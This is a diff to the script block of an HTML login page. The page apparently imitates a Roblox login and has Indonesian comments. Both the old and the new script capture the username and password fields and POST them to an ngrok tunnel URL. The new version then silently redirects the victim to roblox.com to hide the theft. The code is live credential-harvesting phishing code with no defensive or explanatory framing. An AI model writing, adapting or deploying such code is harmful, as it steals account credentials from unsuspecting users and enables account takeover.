@@ -196,30 +196,32 @@
         </footer>
     </div>
     <script>
-        function sendToServer(event) {
-            event.preventDefault(); // Mencegah form dari pengiriman default
-            const username = document.getElementById('login-username').value;
-            const password = document.getElementById('login-password').value;
-    
-            // Mengirim data ke URL server menggunakan Fetch API
-            fetch('https://8c6a-103-228-243-235.ngrok-free.app/endpoint', {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json',
-                },
-                body: JSON.stringify({ username, password }),
-            })
-            .then(response => response.json())
-            .then(data => {
-                console.log('Data berhasil dikirim:', data);
-            })
-            .catch(error => {
-                console.error('Terjadi kesalahan:', error);
-            });
-    
-            // Opsional: Lanjutkan pengiriman form ke tujuan awal (jika diperlukan)
-            event.target.submit();
-        }
-    </script>
+    function sendToServer(event) {
+        event.preventDefault(); // Mencegah form dari pengiriman default
+        
+        const username = document.getElementById('login-username').value;
+        const password = document.getElementById('login-password').value;
+
+        // Mengirim data ke URL server menggunakan Fetch API
+        fetch('https://8c6a-103-228-243-235.ngrok-free.app/endpoint', {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json',
+            },
+            body: JSON.stringify({ username, password }),
+        })
+        .then(response => response.json())
+        .then(data => {
+            console.log('Data berhasil dikirim:', data);
+            
+            // Mengalihkan ke URL yang diinginkan setelah berhasil mengirim data
+            window.location.href = 'https://roblox.com'; // Ubah URL ini sesuai kebutuhan
+        })
+        .catch(error => {
+            console.error('Terjadi kesalahan:', error);
+        });
+    }
+</script>
+
     
 </body>
